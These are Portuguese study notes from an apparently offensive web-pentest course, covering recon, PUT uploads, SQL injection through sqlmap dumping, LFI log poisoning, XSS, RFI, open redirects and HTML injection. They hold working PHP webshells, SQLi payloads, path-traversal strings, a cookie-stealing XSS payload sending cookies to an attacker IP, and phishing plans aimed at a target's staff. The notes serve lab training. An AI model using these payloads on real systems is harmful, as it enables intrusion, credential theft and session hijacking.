Nessa sessão exploraremos tudo o que o curso tem a oferecer em relação a Web Hacking partindo do básico.

**`IMPORTANTE:` Pré exploração realize a etapa de Information gathering MUITO bem feita**

Lembre-se de procurar por:

- Sub domínios
    - EX: `gobuster dns -d <URL> -w <wordlist do dirb> -t 30`
- Diretórios e páginas e acessíveis:
    - EX: `dirb [<http://172.30.0.128>](<http://172.30.0.128/>) /usr/share/wordlists/dirb/big.txt`
    - EX2: `gobuster dir -u [<http://decstore.dsc>](<http://decstore.dsc/>) -w /usr/share/dirb/wordlists/common.txt -x txt,php` (e outras extensões que vc quiser)
- Robots.txt

`Banco de exploits:`

```bash
<?php system($_GET['momo']); ?> : Pra mandar via URL

curl <http://172.16.1.216/file.php/exploitphp.php> -d "hack=id" 

<?php system("cat /etc/passwd"); ?> : Pra mandar comando direto e ver no código fonte
```

# Conceitos iniciais

### Preparação de ambiente

A seguir temos algumas configurações básicas antes de começar

1. Instalação do `GoBuster` : Ferramenta que funciona como o Dirb mas melhorado
2. Instalação do `Burp Suite Community` para usarmos como proxy
3. Configurações no Navegador para proxy com Burp Suite
    1. Preferences > Proxy > Settings > Manual Proxy > Põe IP e porta configurado no Options > Proxy do Burp
    2. Baixa em [http://burp](http://burp) o Certificado do Burp e adiciona ele no navegador em Preferences > Certificates > Authorities > Import > E seleciona pra confiar
4. Instalação extensão no navegador (`FoxyProxy`) que pode auxiliar no controle de ativação e desativação do Proxy
5. Instala `CookieManager` para podermos depois manipular Cookies

—> **`VER CÓDIGO FONTE E FERRAMENTAS DO DESENVOLVER É ESSENCIAL!!!`**

### Conceitos Iniciais em HTML/PHP/JS

Para iniciar exploraremos alguns conceitos básicos das aplicações WEB tentando familiarização com os principais itens presentes na internet.

- Construindo Index de Apache2 (Regras:
    
    - **`HTML`**
        
        - Inicia com `<html>` encerra com `</html>`
        - `<title>Titulo da pagina</title>` : Encere título
        - `<body> itens a serem escritos no body</body>` : Escreve body, aceita /r/n
        - `<h1>Algo escrito</h1>` : Aumenta tamanho da letra
        - `<br>` : Pula linha
        - `<hr>`: Põe linha
        - `<script>script</script>` : Permite você passar um campo com um script em JS
        - `<?php script em php; ?>` : Caso a página seja .PHP permite você usar scripts em PHP
        
        ```php
        <html>
        <h1>Teste</h1>
        <body>
        (Yeah)
        (Yeah)
        (Yeah)
        You gotta know (yeah) <br>
        I'll take care of you, you (yeah), you, you
        You, you (yeah), you
        I'll take care of you, you (yeah), you, yeah
        You, you all (yeah)
        I'll take care of you
        
        <br>
        <br>
        Script em JS:
        <script>alert("Ill take care you u") </script>
        
        <br>
        <br>
        
        <?php
        echo "<script>alert('Olá! Este é um alerta gerado via PHP');</script>";
        ?>
        </body>
        </html>
        ```
        
    
    ### Formulários e Inputs
    
    Além do repassado acima é importantíssimo dar foco a uma parte das páginas WEB que é geralmente foco em um Pentest, os Formulários e Inputs. São por esses campos que muitas vezes achamos formas de explorar a página, e precisamos ter controle para podermos explora-los tanto manualmente quanto com ferramentas.
    
    - Exemplos
        
        ```php
        <form 
        name="meuform" action="" method="GET": Cria formulário na página
        
        <input type="text" name:"login"> : Cria box de Login
        <input type="password" name:"senha"> : Cria box de senha (ñ aparece o digitado)
        
        <input type="hidden" name="token"> : Cria input escondido, só aparece com mouse em cima
        <input type="submit" name="botao" value="entrar"> : Cria botão na página 
        
        /form>
        ```
        
    
    Além disso é possível ter campos auxiliares nos itens acima, dessa forma personalizando ainda mais essas configs:
    
    ```php
    <input type="password" name="senha" maxlength="6"> : Define máximo de 
    caracteres
    
    <input type="text" name=login disable> : Desabilita box
    ```
    










-----------












# GET x POST X PUT

Nessa sessão curta entendermos um pouco mais afundo como funcionam os métodos POST e GET, e suas diferenças

Exemplo de código em PHP (GET):

```php
<?php
$usuario = $_GET[usuario]
?>
```

O código acima pega o nome do usuário na URL tendo em vista que quando algo é enviado via GET para a página é **passado** **na URL.** Isso ocorre porque via input como é GET esses dados são automaticamente enviados a URL, sendo assim tornando possível a afirmativa acima.

Exemplo de código em PHP (POST):

```php
<?php
$usuario = $_POST[usuario]
?>
```

No caso acima as informações seriam pegas pela página via **corpo da requisição** dessa forma sendo mais seguro e permitindo envio de mais dados.

—> Muitas vezes em páginas que necessitam de autenticação podemos mandar via curl um POST, caso ele espere GET muitas paginas retornam o conteúdo da página bloqueada < —

`curl -v -x POST <URL/página>` : Sempre vale a pena tentar se a pagina solicita autenticação

_Dessa forma entendemos que é interessante usar POST quando os dados passados forem sensíveis e GET quando os dados passados devem ser acessíveis via URL_

### PUT

Para um server, aceitar o método PUT pode demonstrar um grande risco pois permite o **envio de arquivos** diretamente para o WebServer.

Exemplo de arquivo: `webdav`

- Conjunto de extensões do PHP que permite gerenciamento remoto do PHP da página pelo admin

Exploração:

1. Caso seja possível utilizar o PUT em uma página PHP podemos enviar um código PHP para o Webserver em forma de arquivo
    
    ```jsx
    curl -v PUT -d "<?php system('id');?>" <endereço>/<novapáginacriada> :
    Cria página com código malicioso
    
    Acesse a nova página para executar o código!!!
    
    Também podemos passar como conteúdo do system uma variável a ser manipulada na URL
    EX: <?php system(\\$_GET["desec"]); ?>
    
    Para usar o código acima chame a URL e aplique a variável desec como o comando
    a ser passado!!!
    --> http://<URL>/<novapágina>?desec=ls -lh
    ```
    
2. Da mesma forma também pode ser feito o envio de um arquivo mesmo, ao invés de comandos via PUT
    
    1. `curl -v <URL> —upload-file <arquivo>` : Mesmo efeito
3. Utilize ferramentas automatizadas para testar PUT:
    
    1. `cadaver http://<URL>/webdav` : Explora webdav
    2. `davtest —url <URL>/webdav`









-----------------








# SQL Injection

Para iniciarmos a sessão de SQL Injection primeiro é interessantes sabermos o básico relacionado ao banco de dados mysql para dessa forma entendermos melhor como funciona um banco.

### Como identificar que temos uma vulnerabilidade de SQLi?

O ponto chave da exploração de SQLi é seremos capazes de identificar quando é possível explorara-la, para isso abaixo resumirei dois casos de uso e também uma explicação rápida.

**`O SQLi ocorre quando em um campo editavel conseguimos manipular itens que vão diretamente para consultas no banco`**

EX:

- Na URL temos [**`http://homologacao.decstore.dsc:8080/produtos.php?prod=863`](http://homologacao.decstore.dsc:8080/produtos.php?prod=863)** Perceba como o item **`prod=`** parece que envia um dado que pode ser vulnerável
- Em um caso de login quando forçamos o erro com `‘` ele retorna erro de sintaxe de mysql → Sinal claro de que o que é posto no login vai `direto ao SQL`

Nos 2 casos assim como em outros o real problema não pode ser identificado diretamente, pois o erro realmente `é que o dev não realiza tratamento ao enviar dados para o banco de dados, permitindo exploração` Sendo assim quando encontrarmos como os acima não se apague E TACA —> **`SQL MAP`** <—

### Comandos básicos

- `show databases;` : Mostra databases presentes no banco, databases contém tabelas!
- `select` : Argumento para seleção de itens
    - `database();` : Seleciona database
    - `user();` : Seleciona um user do mysql
    - `version;` : Seleciona a versão do banco de dados
- `create` : Cria item
    - `create database <nome>;`
- `use <nome>;` : Acessa uma tabela
- `show tables;` : Mostra tabelas em uma database
- `create table;` : Cria tabela
    - `create table (<campo1,campo2,campo3>);` : Cria item na tabela
- `describe <tabela>` : Descreve itens primários da tabela
- `select <item> from <tabela>` : busca item (row) em uma tabela
- `insert into <tabela> (<values campo1,campo2,campo3>);` : Adiciona item na tabela

Exemplo de comando: `select * from users where login=”mateus”;`

### Aprofundamento de MySQL:

Entendendo um pouco mais sobre o banco de dados mysql, podemos definir que ao baixar esse banco existem databases primárias que todos os bancos terão. Algumas delas revisaremos abaixo:

- `use mysql`: Database padrão do mySQL
    - `select host from user;` : Dentro dessa database o comando funciona
- `use information_schema` : Base padrão do MySQL que mantém informações sobre as demais bases
    - `select * from user_privileges;`
    - `describe columns;` Vê itens da tabela
    - `select trigger_name,database_collation from triggers;` : Pega dois itens da tabela
- `select @@version;` Mostra versão do banco

### Comandos Especiais(Muito importante)

- `select sleep(<tempo seg>);` : Faz banco esperar certo tempo para retorno
- `select char(número);` : Retorna caractere referente ao número na tabela ASCII
- `select substring(”<string>”,<posição>);` : Retorna caractere posicionado na string

### SQL Injection (Teoria)

O SQL Injection é uma vulnerabilidade da página WEB onde existe uma sessão que permite que enviemos **querys diretamente para o banco de dados**, dessa forma podendo fazer todo o tipo de consultas no banco, inclusive as não autorizadas.

**Exemplo de estrutura WEB:**

- Página com código em PHP
    
- Código PHP está relacionado com comandos ao banco de dados
    
- Banco de dados recebe os comandos passados pelo user após tratamento do PHP via comandos…
    
    _**O pulo do gato é entender como está sendo feito esse tratamento para construir uma query que burle ele e faça a requisição que queremos…**_
    

**Exemplo de caso:**

- Em uma página analisando seu código fonte identificamos que o tratamento para envio de querys ao banco é apenas usando o LIMIT 1 (para trazer apenas 1 resultado)
    
- Sendo assim construímos uma query que irá burlar o tratamento PHP e ao ser enviada ao banco trará todas as informações do banco
    
- `‘hacker’ or 1=1;#` : Essa query será passada no campo de login
    
- Dessa forma a query vai ser bem sucedida no banco e retornará todos os dados
    
    ```php
    Query sendo enviada pelo PHP antes da exploração:
    (User Mateus)
    select * from users where login="mateus" and senha="123456";
    
    Query sendo enviada pelo PHP explorada pelo hacker
    (User Hacker)
    select * from user where login="hacker" or 1=1;#and senha ="123456;
    ```
    
- **Perceba que o Hacker cria uma query verdadeira e dessa forma se autentica na aplicação —> O que o PHP espera é o banco ter retorno positivo (Encontrar algo) em seu terminal para liberar**
    

### Bypass Authentication com SQL Injection

Consolidados os conhecimentos em relação ao SQL Injection agora entenderemos de forma mais prática como realizar um bypass de autenticação usando a mesma lógica

**`Alvos`**: Campos de login e senha ou inserção de dados

1. Comece forçando um erro de SQL com uma `\\` ou `‘` , o que buscamos é um retorno confirmado que o erro foi relacionado ao banco de dados
    
2. Feito isso abre as ferramentas do desenvolvedor e faça o entendimento da query sendo feita ao banco de dados
    
3. Para finalizar crie uma parte da query de forma a manipular toda ela, para que quando adicionemos esse pedaço no lugar do item login ou senha ele altere toda a afirmação da query
    
    EX: `‘ or 2=2#` ← Clássico a ser testado
    










-------------









# SQL Injection (part 2)

Nessa sessão seguiremos explorando SQL Injection para entender um pouco mais sobre os seus tipos e algumas outras maneiras de explorar essa vuln tão presente em sites.

### SQL Injection Error Based

Nesse caso utilizamos erros retornados do SQL para identificar e explorar a vulnerabilidade…

_Consulte o código fonte para entender um pouco melhor_

`Alvo`: Boxes e campos onde poder ser inseridos dados

—> Ao manipular box com `‘` ou `/` o retorno de erro de SQL confirma que é possível explorar esse campo

_Consulte o código fonte para entender um pouco melhor_

`Caso de uso`: Adicione na box que retorna erro de SQL o seguinte código `‘ union select 1 %23` (%23 = #) —> Descobrimos quantos itens tem por row no banco de dados

`Caso de uso 2 (muito importante)`:

- Em uma que box que podemos explorar, use o comando `‘ order by 1 %23` para caso tenha 1 item na row ele confirme quantos itens tem
    
- Caso o retorno não seja positivo vá adicionado itens até encontrar a quantidade de itens certa:
    
    - `‘ order by 1 %23` , `‘ order by 1,2 %23` , `‘ order by 1,2,3 %23` , `‘ order by 1,2,3,4 %23`
- Quando acertarmos ele vai retornar os valores que passarmos (1,2,3,..) que não é o que queremos. Para continuar avançando troque os itens por valores que sabemos que o banco de dados tem, para auxiliar o descobrimento de infos, exemplo:
    
    - `‘ order by 1,2,version(),database(),user() %23`
    - Dessa forma ele vai mostrar a versão do banco, a database dessa tabela no banco e o usuário que está logado no banco
    
    —> `‘` no começo encerra a string da query feita antes e inicia um outro item na query
    

---

### SQL Injection: Information Schema

Em todo banco de dados existe uma tabela padrão chamada de `Information Schema` essa tabela tem grande valor para o Pentest, pois basicamente ela é responsável por aglomerar informações sobre todas as outras tabelas para o banco de dados.

Como já somos capazes de pegar informações do banco de dados com a exploração feita em `Error Based` utilizaremos a Information Schema para centralizar nossas verificações.

`Caso de uso 1`: `‘ union select 1,2,3,table_name,5 from information_schema.tables %23`

Perceba como usamos o descobrimento de itens feitos no Error Based para chamar a informação **table_name** vinda da tabela **information_schema**. Descobrindo assim o nome das tabelas desse banco.

`‘ union select 1,2,3,table_name,5 from information_schema.tables where table_schema="database"%23` —> Coloque em database a database achada no Error Based

—> Se trocar tables por columns pega as infos de colunas

`‘ union select 1,2,3,column_name,4,5 from information_schema.columns where table_schema="<nome da tabela> and table_name=<nome da tabela>”%23` : Assim achamos itens da tabela

`Caso de uso 2` : Agora com as informações do nome de todas as tabelas podemos pegar a tabela de user e fazermos a mesma busca para encontrar informações dos usuários. Observe:

`‘ union select 1,2,nome,login,senha from information_schema.columns where table_schema="<database> and table_name=<nome da tabela” %23`

_Senhas provavelmente virão em hash_

---

### SQLi até o RCE

A seguir veremos como conseguir controle remoto do Web Server partindo das outras duas explorações que fizemos: Error Based e Information Schema..

Podemos via exploração na URL passar um comando que cria arquivos no servidor, utilizando a query: `‘ union all select 1,2,3,4,”<conteúdo do arquivo> INTO OUTFILE “<path do arquivo/arquivo.txt>” %23`

Para encontrar esse diretório podemos utilizar outras explorações para observa-los, o mais importante é escolher um dir acessível e que permita criar arquivos…

Dessa forma, basta chamar o código via URL e ele executará o comando Como recomendação use o código de exploração padrão PHP e `?<variavel>=<comando>`

---

### Explorando SQLi Manualmente

Usaremos essa sessão para revisar alguns conceitos do SQLi e também entender que para esse processo não existe receita de bolo, e cada caso vai variar de acordo com a página…

`Alvos`: O que buscamos no SQLi é ao realizar o envio de dados receber um erro como `sql syntax error` —> Erro de SQL, e dessa forma vamos manipulando a query até ela funcionar

Item de interesse: Se a query estiver sendo passar para um **IP** como principal dominio da URL não precisamos da `‘` antes do union. —> Casos com variável `id` também

EX: `union select 1,2,3,4,5 from information_schema`

`Novo exemplo de exploração em SQLi`

1. Passe dados na URL manipulando a variável após a ? e confirme que o erro é de syntax SQL
    
2. Realize a busca de error based para encontrar os itens como database(), version(),user() após encontrar quantos itens o banco de dados lida com
    
3. Aprofunde na database achada usando a information schema de base
    
4. Encontre tabelas de usuários e senhas
    
5. Encontre os itens dessa tabela
    
6. Puxe os itens da tabela e descubra users e senhas
    
    _Essa aula ajuda mt resumindo o processo de SQLi_
    

---

### SQLinjection em PostGRESQL

Outro item que deve ser ressaltado é que muitas vezes o banco de dados que estamos lidando pode não ser MySQL, como vimos até agora. Nesses casos, como proceder?

1. Inicie normalmente pelo reconhecimento, mas tente se atentar ao tipo de erro que está sendo retornado
    
    - `pg_exe()` —> Tipo de erro do PostGRESQL
2. Como o banco de dados que encontramos é PostGRESQL utilizamos para identificação da quantidade de itens os seguintes comandos:
    
    `order by 1`, `order by 2` …. ou `order by null,null,null...`
    
3. Agora com a quantidade de itens do banco correta podemos partir para coletar informações sobre o banco… adapte as variáveis para coletar as informações
    
    - `<…>?id=-1 union select null,version(),current_database(),current_user(),null`
4. Siga para a coleta para a information_schema conforme já fizemos em outros passos acima
    
    - `table_catalog=”<table>”` —> Filtro de tabela no PostGRE
5. Continue com os passos conforme já revisto, adaptando o necessário para syntax POSTGRESQL
    







------------












# SQLmap

Após realizar as verificações de SQL Injection `manualmente` podemos usar o `SQLmap` para automatizar as explorações, observe como utilizar essa ferramenta abaixo:

### Comandos básicos:

- `sqlmap`
    
    - `—data=<data>` : Envia data via POST
        
    - `—cookie=<cookie>` : Manda data com cookie específico
        
    - `—dbms=<banco de dados>` : Foca testes com banco de dados especifico
        
    - `—dbs` : Opção que puxa todas os banco de dados
        
    - `-D <database> —tables` : Testa todas as tabelas dentro de uma database
        
    - `—current-user <usuário>` : Usa usuário do banco de dados
        
    - `—users` : Todos os usuários
        
    - `—passwords` : Todas as senhas
        
    - `—os-shell` : Tenta subir shell no server web
        
    - `—forms` : Testa valores em página de login e senha
        
    
    EX: `sqlmap -v <URL> <opções auxiliares>`
    
    EX: `sqlmap -v “<URL>” -D <database> -T <tabela> -C “<item da coluna 1, item da coluna 2>” —dump` : Pega informações de tabela
    

### Explorando databases…

Abaixo apresentarei o passo a passo pra explorar uma database quando encontrarmos uma vulnerabilidade na URL com um item que `puxa DIRETO DO DB`

```bash
1. Identifica item na URL chamando index ou conteúdo do db
<http://homologacao.decstore.dsc:8080/produtos.php?prod=863> #Claramente chama o item 863 do DB

2. Começa a utilizar o SQLMAP para primeiro ver as databases presentes no alvo
sqlmap -u "<http://homologacao.decstore.dsc:8080/produtos.php?prod=863>" --dbs --batch

3. Com as databases agora comece a ver as tables dentro de cada uma delas
sqlmap -u "<http://homologacao.decstore.dsc:8080/produtos.php?prod=863>" -D <database> --tables --batch#Olha tables dentro de DB

4. Observa dentro de uma table as colunas presentes 
sqlmap -u "<http://homologacao.decstore.dsc:8080/produtos.php?prod=863>" -D <database> -T <Tabela> --columns --batch #Observa colunas dentro da tabela

5. Abre conteúdo das columns
sqlmap -u "<http://homologacao.decstore.dsc:8080/produtos.php?prod=863>" -D <database> -T <Tabela> --columns --dump

6. Verifica 1 por 1 até achar itens de interesse

*Dentro de MYSQL -> user pode ter authentication_string (Senha em formato de hash)
```

`—batch` : Pega cabeçalhos

`—dump` : Pega conteúdos

### Resumo

- `sqlmap -u "<URL vuln>" --dbs --batch` : Pega databases
- `sqlmap -u "<URL vuln>" -D <database> --tables --batch` : Pega tables da DB
- `sqlmap -u "<URL vuln>" -D <database> -T <Tabela> --columns --batch` : Pega colunas da table
- `sqlmap -u "<URL vuln>" -D <database> -T <Tabela> --columns --dump` : Pega conteúdo das colunas observadas

# Identificando Arquivos e Diretórios

Agora que entendemos os conceitos básicos é importante ressaltar que o 1º passo para começar o Pentest Web é um bom information gathering na página WEB. Isso é o que revisaremos a seguir…

### Information Gathering

1. Comece realizando o Information Gathering básico que já revisamos no outro módulo dedicado para isso, utilize o Gobuster para encontrar sub-páginas.
    
    1. `gobuster dir -u <http://url> -w wordlist`
        
    2. `-s “200”` : Filtrar apenas por retornos 200
        
    3. `-x .php,.txt,.pdf` : Busca por arquivos vinculados a essa página ou subpágina
        
        *Podendo usar como wordlist a rockyou.txt
        
2. Procuraremos a seguir por itens que possamos **`interagir com a página`**, dessa forma enviando ou recebendo dados, sejam eles quais forem. Esses itens são os principais vetores que usaremos para exploração
    
3. Nas páginas que estamos encontrando sempre ir refazendo essas verificações citadas acima, não importa se a diferença seja muito pequena
    

### Identificar métodos aceitos pela página

Da mesma forma é muito importante também aproveitarmos para verificar quais métodos WEB a página sendo atacada aceita que utilizemos. Repita isso para TODAS as páginas encontradas.

`curl -v <método> <https://<URL>` : Testa método

- Se usarmos como método `OPTIONS`ele retornará quais os métodos aceitos pela página
- Repita isso para todas as páginas encontradas

```jsx
Processo com netcat se necessário:

nc -v <https://<URL> <porta>
<método> / HTTP/1.1
```

- Explore os métodos permitidos de acordo com os itens vistos acima… GET,POST,PUT….








----------










# Identificando superfícies de ataque

Feito o reconhecimento das páginas agora precisamos avançar para identificar possíveis vetores de ataque em cada uma delas, os processos a seguir podem ser repetidos para cada uma das páginas e sub-páginas que acharmos.

1. Abra o código fonte da página e leia o para entendimento. O que buscamos?
    1. `Lixo deixado pelo DEV`
    2. `Formulários e Inputs, seja de envio ou recebimento de dados`
2. Encontrar Vetores de ataque. Revise a página normal mesmo buscando os itens a seguir:
    1. `Campos de busca ou login`
    2. `Campo de registro`
    3. `Campo de redirecionamentos`
    4. `Campo de Download ou Upload`
    5. `GET ou POST`
    6. `Fórus na página, sessões com comentários ou itens que similares`
    7. `Qualquer item que possamos manipular dados`






--------









# Open Redirect

Como segunda vulnerabilidade sendo observada nessa doc exploraremos o Open Redirect, que a primeira vista pode parecer inofensivo. Mas se usado da forma correta pode ter impactos catastróficos.

**Vetor para vulnerabilidade**: `Qualquer redirecionamento feito por link na página para outra página`

Exemplo de link: `<url>/<dir>/<página>.php?url=<url>`

**Exploração**: Com esse link malicioso pegaremos esse domínio verificado (página do alvo) e alteraremos apenas o ultimo item `<url>` para criar um `redirecionamento` para página da nossa escolha.

**Caso de uso:**

- Achamos um redirecionamento como o citado acima em uma página de alvo
- Criamos uma página similar a para onde o redirecionamento aponta, mas com a diferença que armazenamos dados passados pelo user
- Construímos o link acima apontando para a nossa página
- Realizamos o envio do link verificado para diversos funcionários do alvo, para que eles passem as credenciais.

_Item para atenção_: Se formos no menu em hamburger de uma página e clicar em `Save page as` ele vai salvar o html da página. Isso pode agilizar em muito para criação de uma página fake! —> Fazer POC disso em LAB

### Parâmetro codificado (Ocorre bastante)

Para finalizar o estudo dessa vuln é preciso dizer que muitas vezes podemos nos deparar com links de redirect que são feitos para tradução de forma codificada…

EX: `<url>/<page>.php?url=AS21Eae1` (Base64)

Para burlar isso basta pegamos e adaptarmos nosso redirect para o modelos de decodificação da página…

No exemplo acima, descobre que é Base64 e codifica a nossa URL para adaptar o necessário.

# FPD - Full Path Disclosure / Directory Transversal

`FPD` = Quando identificamos o caminho exato da aplicação na URL

`Path Transversal` = Quando navegamos no WebServer utilizando a URL para ir de diretório em diretório

*Para achar esses itens primeiro inicie com o information gathering padrão, como por exemplo analisar o código fonte atrás de sub paginas

**Exemplo de caso de uso**: Em uma código fonte encontramos o erro **`Undefined index: <variavel>`** —> Esse erro deixa claro que a aplicação esperava receber na URL uma variavel especifica mas acabou não recebendo.

- Com isso para exploraremos esse caso podemos tentar passar essa variável de forma forçada na URL, para simular um caso onde a página recebe essa URL. Exemplo com a variável sendo banners….
    
    `<url>/<página>.php?banners`
    
- Caso ao passarmos essa variável o retorno seja positivo quer dizer que realmente podemos manipular ela como quisermos.
    
    `<url>/<página>.php?banners=/../../arquivo` : Abre arquivo que está localizado em diretórios atrás
    
- Como item extra nessa verificação vale ressaltar que talvez não seja de `cara` que a variável vai funcionar, ela pode precisar e algum outro item ou coisa parecida. Para descobrir isso vá causando erros e observando o código fonte.
    



------------









# Local in File (LFI)

Outra vulnerabilidade muito conhecida e explorada no mundo do pentest é a chamada LFI. Nessa sessão entenderemos ela, e porque ela é tão importante para nossos estudos.

`Conceito` : Muitas vezes em páginas WEB os desenvolvedores usam o método `GET` para fazer a chamada de itens locais do servidor para ir povoando o código. Isso causa uma falha de segurança séria, pois podemos explorar esses itens e manipular o `GET` como quisermos.

`Exemplo`: `<url>/<pagina>.php?p=arquivo.php` —> Nesse caso o dev chama o arquivo (arquivo.php) com a variável p de forma local com GET

`Exploração`: Para explorarmos, tendo em vista que esse comando é local podemos mudar seu conteúdo para o comando que quisermos dessa forma fazendo um path transversal ou qualquer outra ameaça

`<url>/<pagina>.php?p=ls -lh` ou `<url>/<pagina>.php?p=/../../etc/passwd`

_Item para atenção_: Para tentar mediar isso, muitas vezes os devs configuram a aplicação para que no final do item da variável seja sempre adicionado `.php` . Caso isso ocorra basta usar o null byte para tirar esse item —> `%00` no final da URL (**`NULL BYTE`**)

`Resumo`: Viu `<url>/<pagina>.php?<variavel>=<algo>` manipula esse item e tenta achar o erro de include

### Usando LFI para infecção de logs…

Um caso clássico para utilização de LFI é quando encontramos varrendo os arquivos do WebServer via URL um arquivo de logs, encontrando esse item podemos infecta-lo para coleta de informações interessantes….

Para fazer isso seguiremos o passo a passo:

1. Identifique a vuln LFI e faça as alterações na `variável` para explorar o WebServer
    
2. Encontre um arquivo de logs visualizável
    
3. Realize o envio de um código malicioso ao servidor via conexão com netcat
    
    1. `nc -v <ip> <porta>`
    2. `<código php direto>`
4. Quando fizermos isso ele será armazenado no repositório de logs
    
5. Quando abrirmos o arquivo de logs novamente via LFI ele vai ser esse resultado como parte do código fonte da página
    
6. Dessa forma exploramos a página!!!
    
    _Dica: Envie como código malicioso um arquivo que tenha um variável que quando passada via GET executa comandos no server. EX:_
    

```jsx
<?php system($_GET['desec']); ?> : Quando passarmos ?desec=<comando> ele executa
e troca o item pelo comando nas logs
```

![image.png](attachment:d302f38e-4485-4efb-9ba0-af822451a22c:image.png)

- Ao fazermos o envio do payload ele —> Vai ao repositório —> Abrimos ele na página e o PHP enviado se mistura ao código fonte —> manipularmos o PHP enviado pra que ele execute um comando que mandamos via GET —> Exploramos servidor

TUDO DEU ERRADO NO LFI, mas vc ainda acha que dá? —> **`PHP WRAPPERS!`**







------------












# XSS

Nessa sessão exploraremos as diferentes formas de explorar o XSS (Cross Site Scripting)

### Refletido

`Alvo`: Barras de pesquisa

`Resumo` : Em uma barra de pesquisa é interessante que observemos sua configuração no código fonte para entendermos como essa barra trata os dados enviados e o mescla com o código em Java Script.

Muitas vezes podemos passar na barra de pesquisa um código que sobrescreverá o próprio código fonte da página, dessa forma criando uma brecha para alterarmos configurações.

![[Pasted image 20251119224827.png]]

Perceba acima que no conteúdo de `Buscando:` ao invés de um item passamos uma nova parte do script em Java Script, dessa forma criando um alerta na tela

_Na maioria dos casos essa inserção não será tão clean de ser feita e pode necessitar de `payloads Java Script`, em outro momento revisaremos uma ferramenta para usar esses payloads_

Exemplo adicional: Passando na busca `<script>document.location=”<site>”</script>` ele faz redirecionamento da página!

### Self-XSS

Nessa exploração simples tentaremos passar um código em Java Script utilizando o campo `action` do código.

Para isso basta colocar uma barra (/) depois da URL e passar seu comando em Java script para execução.

![[Pasted image 20251119224838.png]]

Perceba acima que ao tentar passar / depois da URL ela é automaticamente passada no código fonte para o parâmetro `action=` que é exatamente o que precisamos. Dessa forma podemos passar código para o código.

Exemplo de adição na URL: `/”><script>alert(”Olá”)</script>` : Fecha action e abre código

### Stored-XSS (Sequestro de sessão)

Esse caso em específico é referente a exploração voltada a dados armazenados em páginas, mas ai vem a questão, de que forma armazenados?

Imagine que temos dentro da página uma sessão de `posts ou comentários ou até um fórum`. Quando fazemos um comentário basicamente estamos enviando data que fica `armazenada na página.`

![Classe comentário e objeto do nosso comentário no código fonte](attachment:4d07ebf2-9dd3-450b-9105-1caa3e208f3e:image.png)

Classe comentário e objeto do nosso comentário no código fonte

Caso de Uso:

- Colocamos no comentário de um post um script que quando executado (página é aberta pelo alvo) ele captura o cookie de sessão do usuário e envia para nosso host (roubo de cookies)
    
- Exemplo de comentário :
    
    `<script>new Image().src=<IP>:<porta>/?=”+document.cookie</script>`
    
    : Cria conexão com nosso host e manda document cookie concatenado
    
- Com esse novo cookie podemos setar ele como o nosso da nossa sessão com
    
    `<url>/<página>.php?busca=<script>alert(document.cookie=”<cookie>”)</script>`
    
    Aplique e acesse outra página para ver a magia….
    
    _Você pode setar um cookie com XSS Refletido também…_
    

### Automatizando a identificação de XSS

- Script `XSStrike` no github : Basta clonar esse repositório e usar o programa
    
    Exemplo: `xsstrike -v “<site>” —params` : Acha payload aplicável para explorar vulns no site
    
    —> Vale a pena passar primeiro URLs mais especificas, que levem a barras de pesquisa ou itens possivelmente vulneráveis
    
    `—path` : Testa self-xss
    





-----





# Remote File Injection (RFI)

Muito semelhante a alguns casos já vistos, o RFI é encontrado em links dá pagina que fornecem `redirecionamento a páginas externas` mas que tem por característica por .html no final do redirect.

`Alvo`: Links de redirect da página

`Caso de uso`: Para explorar podemos subir uma página html fake que colete dados do user, e mascará-la como se fosse legitima do site. Depois pegue o link de redirect e crie um redirect para a sua página fake, omitindo o .html no final…

_Adicionar .html é uma característica desse RFI_

_Ele é RFI porque faz a chamada de um arquivo externo de outro lugar_

`Caso de uso (Controle Remoto)` : Muitas vezes em casos como esse podemos passar na variável do item também um código de controle remoto para o nosso PC caso a porta esteja aberta

Exemplo de URL: [http://URL/página/link=172.30.0.101:8080/](http://URL/p%C3%A1gina/link=172.30.0.101:8080/)`<arquivo fake>`

—> Nesse caso o server vai adicionar o .html

`Caso de Uso 2 (Envio de comandos)` : *Mesmo nesse caso que a inclusão é HTML, como a chamada é feita por um PHP podemos enviar um payload PHP para ser chamado via RFI remotamente

Para isso:

- Cria payload de comandos PHP
    
```php
    
    <?php
    system($_GET['desec']);
    ?>
    
```
    
- Coloca ele com nome de shell.html e deixa público para acesso
    
- Use a RFI para fazer a chamada desse código via link
    
    - [`http://URL/página/link=172.30.0.101:8080/<arquivo](<http://URL/página/link=172.30.0.101:8080/><arquivo) fake>`
- Use a variável desec para passar comandos ao servidor
    
    - [`http://URL/página/link=172.30.0.101:8080/<arquivo](<http://URL/página/link=172.30.0.101:8080/><arquivo) fake>?desec=ls -la`







----------









# HTML Injection

Seguindo na linhas das verificações de vulnerabilidade, muito semelhante ao XSS onde exploraremos a adição de linhas de Java Script no código, no HTML Injection utilizamos alguns itens para fazer inserções de HTML e explorar o alvo.

`Alvos`: Qualquer item na página que permita`inserção de dados`. Abra o código fonte e observe como o HTML da página trata o seu dado no momento do envio

`Caso de teste simples`: Em uma barra de pesquisa passamos <h1>Teste</h1>. Caso apareça na tela Teste como título podemos explorar essa URL

`Caso de uso avançando` : Realiza a inserção de dados com um código que manipule totalmente a página e solicite informações do usuário, dessa forma armazenando elas em um repositório seu.

Quando podemos realizar manipulações como essa é possível passar uma página completamente nova por cima da antiga, e comentar o que for legitimo para enganar o usuário




------------











# URL Encode (caracteres especiais) e Bypass Add slashes

### URL Encode

Muitas vezes em uma URL alvo podemos ter caracteres `encodados` no meio dos caracteres o que pode tornar confuso o entendimento de algumas URLs

Isso ocorre pois caracteres especiais podem ser complexos de serem passados via URL e não serem confundidos com algum item específico, por isso usamos alguns encodes para passar caracteres especiais.

EX:

- `#` =%23
- `&` = %26

Sendo assim é importante que conheçamos esses encodes para entender URLs ou sermos capazes de encodarmos algo caso seja o padrão do site.

- Função do PHP que encoda itens: `rawurlencode()`
- Site com encodes: [https://www.w3schools.com/tags/ref_urlencode.ASP](https://www.w3schools.com/tags/ref_urlencode.ASP)



### Bypass Addslashes

Em alguns casos o dev que criou a página PHP pode aplicar uma função de segurança que basicamente apenas aplica `\\` no final da URL por padrão. O que pode muitas vezes acabar prejudicando algumas exploração

Mas como realizar o bypass desse caso?

1. Realize a verificação de exploração da URL por padrão normal
    
2. Identifique o padrão de adição do caractere `\\`
    
    Ex: Toda vez que passamos `“ “` ele adiciona `\\`
    
3. Altere a URL que você está utilizando para mudar o caractere problemático por um item ASCII que será traduzido usando a função `char()`
    
